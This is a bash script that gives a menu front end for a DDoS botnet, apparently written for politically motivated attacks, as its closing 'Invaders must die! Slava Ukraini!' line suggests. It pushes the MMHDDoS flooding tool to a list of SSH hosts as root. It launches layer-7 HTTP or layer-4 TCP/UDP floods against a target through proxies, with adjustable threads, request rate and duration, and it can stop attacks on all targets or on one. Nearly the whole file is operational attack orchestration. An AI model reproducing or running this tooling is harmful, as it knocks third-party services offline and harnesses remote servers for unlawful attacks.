#!/bin/bash

CURRENT_DIR=$(dirname "$0")
export DIALOGRC="$CURRENT_DIR/.dialogrc"

while : ; do
    MENU_OPTION=$(dialog --title 'Botnet' --menu --stdout "Choose option:" 15 55 5 1 'Setup SSH hosts' 2 'Botnet attack on host' 3 'Stop all botnet attacks' 4 'Stop certain host/ip attack in botnet' 5 'Exit')

    case $MENU_OPTION in

    1)
        if dialog --title "Setup SSH hosts" --stdout --yesno "Following command will install MMHDDoS tool to your SSH hosts\n                    Do you want to proceed?" 7 65; then
          CURRENT_DIR=$(dirname "$0")
          bash "$CURRENT_DIR/runoverssh" --script "$CURRENT_DIR/attacker-setup.sh" --hostsfile "$CURRENT_DIR/hosts.txt" root
        fi
        break
        ;;

    2)
        MENU_OPTION=$(dialog --title 'Attack type' --menu --stdout "Choose option:" 15 55 2 1 'L7 Attack - HTTP protocol' 2 'L4 Attack - TCP/UPD protocol' 3 'Back')

        case $MENU_OPTION in

        1)
            ATTACK_TYPE=$(bash "${CURRENT_DIR}/l7.sh")
            TARGET=$(bash "${CURRENT_DIR}/url.sh")
            SOCKS_TYPE=$(bash "${CURRENT_DIR}/socks_type.sh")
            THREADS=$(bash "${CURRENT_DIR}/threads.sh")
            PROXY_FILE=$(bash "${CURRENT_DIR}/proxy_file.sh")
            RPS=$(bash "${CURRENT_DIR}/rps.sh")
            DURATION=$(bash "${CURRENT_DIR}/duration.sh")

            clear
            printf "Starting L7 attack...\n"
            bash "${CURRENT_DIR}/botnet-attack.sh" "$ATTACK_TYPE" "$TARGET" "$SOCKS_TYPE" "$THREADS" "$PROXY_FILE" "$RPS" "$DURATION"
            break
            ;;

        2)
            ATTACK_TYPE=$(bash "${CURRENT_DIR}/l4.sh")
            TARGET=$(bash "${CURRENT_DIR}/url.sh")
            THREADS=$(bash "${CURRENT_DIR}/threads.sh")
            DURATION=$(bash "${CURRENT_DIR}/duration.sh")
            SOCKS_TYPE=$(bash "${CURRENT_DIR}/socks_type.sh")
            PROXY_FILE=$(bash "${CURRENT_DIR}/proxy_file.sh")

            clear
            printf "Starting L4 attack...\n"
            bash "${CURRENT_DIR}/botnet-attack.sh" "$ATTACK_TYPE" "$TARGET" "$THREADS" "$DURATION" "$SOCKS_TYPE" "$PROXY_FILE"
            break
            ;;


        3)
            continue
            ;;

        esac
        ;;
        
    3)
        bash "${CURRENT_DIR}/botnet-stop-all.sh"
        break
        ;;
    
    4)
        TARGET=$(bash "${CURRENT_DIR}/url.sh")
        bash "${CURRENT_DIR}/botnet-stop-certain.sh" "$TARGET"
        break
        ;;
    
    5)
        break
        ;;

    esac
done
printf "\nInvaders must die! Slava Ukraini!\n"

